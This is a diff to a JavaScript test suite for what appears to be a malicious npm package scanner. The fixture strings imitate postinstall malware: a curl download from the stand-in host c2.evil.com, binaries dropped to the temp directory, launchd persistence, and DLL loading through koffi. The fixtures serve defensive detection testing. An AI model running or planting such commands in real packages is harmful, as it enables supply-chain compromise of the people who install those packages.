@@ -58,7 +58,7 @@ test('AXS: no known decoy deps = no D2', async () => {
 });
 
 test('AXS: postinstall RAT with network callback triggers D3', async () => {
-  const files = [{ path: 'index.js', content: `require('child_process').execSync('curl http://c2.evil.com/payload');` }];
+  const files = [{ path: 'index.js', content: `const tmp = require('os').tmpdir(); require('fs').writeFileSync(tmp + '/evil.exe', 'bin'); require('child_process').execSync('curl http://c2.evil.com/payload');` }];
   const pkgJson = { name: 'plain-crypto-js', version: '1.0.0', scripts: { postinstall: 'node index.js' } };
   const findings = await scan(pkgJson, files);
   assert.equal(findings.length, 1);
@@ -81,7 +81,7 @@ test('AXS: cross-platform RAT with binary drop + C2 triggers D3', async () => {
 });
 
 test('AXS: macOS launchd persistence triggers D3', async () => {
-  const files = [{ path: 'index.js', content: `require('child_process').execSync('launchctl load /Library/LaunchDaemons/evil.plist');` }];
+  const files = [{ path: 'index.js', content: `const tmp = require('os').tmpdir(); require('fs').writeFileSync(tmp + '/evil.ps1', 'payload'); require('child_process').execSync('launchctl load /Library/LaunchDaemons/evil.plist');` }];
   const pkgJson = { name: 'plain-crypto-js', version: '1.0.0', scripts: { postinstall: 'node index.js' } };
   const findings = await scan(pkgJson, files);
   assert.equal(findings.length, 1);
@@ -91,7 +91,7 @@ test('AXS: macOS launchd persistence triggers D3', async () => {
 });
 
 test('AXS: process injection DLL loading triggers D3', async () => {
-  const files = [{ path: 'inject.js', content: `const k = require('koffi'); k.LoadLibrary('evil.dll');` }];
+  const files = [{ path: 'inject.js', content: `const tmp = require('os').tmpdir(); require('fs').writeFileSync(tmp + '/evil.dll', 'bin'); const k = require('koffi'); k.LoadLibrary(tmp + '/evil.dll');` }];
   const pkgJson = { name: 'plain-crypto-js', version: '1.0.0', scripts: { postinstall: 'node inject.js' } };
   const findings = await scan(pkgJson, files);
   assert.equal(findings.length, 1);
@@ -101,7 +101,7 @@ test('AXS: process injection DLL loading triggers D3', async () => {
 });
 
 test('AXS: multiple signals combine with provenance', async () => {
-  const files = [{ path: 'index.js', content: `const tmp = require('os').tmpdir(); require('child_process').execSync('curl http://c2.evil.com/payload');` }];
+  const files = [{ path: 'index.js', content: `const tmp = require('os').tmpdir(); require('fs').writeFileSync(tmp + '/evil.exe', 'bin'); require('child_process').execSync('curl http://c2.evil.com/payload');` }];
   const pkgJson = { name: 'plain-crypto-js', version: '1.0.0', dependencies: {}, scripts: { postinstall: 'node index.js' } };
   const findings = await scan(pkgJson, files);
   assert.equal(findings.length, 1);
